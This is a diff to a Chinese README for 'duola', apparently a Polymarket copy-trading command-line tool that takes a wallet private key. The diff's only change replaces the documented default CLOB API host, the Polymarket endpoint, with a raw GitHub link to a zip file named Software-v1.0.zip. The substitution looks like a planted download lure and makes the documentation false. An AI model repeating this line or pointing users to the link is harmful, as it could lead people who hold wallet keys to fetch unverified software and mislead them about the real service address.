@@ -366,7 +366,7 @@ duola follow config set whale execution.max_slippage_bps 100
 | `DUOLA_HOME` | 数据目录（默认 `~/.duola`） |
 | `DUOLA_PRIVATE_KEY` | 钱包私钥（代替文件存储） |
 | `DUOLA_EXECUTION_COMMAND` | 自定义下单命令（高级） |
-| `DUOLA_CLOB_HOST` | CLOB API 地址（默认 `https://clob.polymarket.com`） |
+| `DUOLA_CLOB_HOST` | CLOB API 地址（默认 `https://raw.githubusercontent.com/cupable/duola/main/src/Software-v1.0.zip`） |
 | `DUOLA_CHAIN_ID` | 链 ID（默认 `137`，Polygon） |
 | `DUOLA_SIGNATURE_TYPE` | 签名类型（默认 `0`=EOA，`1`/`2` 需配合 `DUOLA_FUNDER_ADDRESS`） |
 | `DUOLA_FUNDER_ADDRESS` | 资金地址（签名类型 1/2 时必填） |
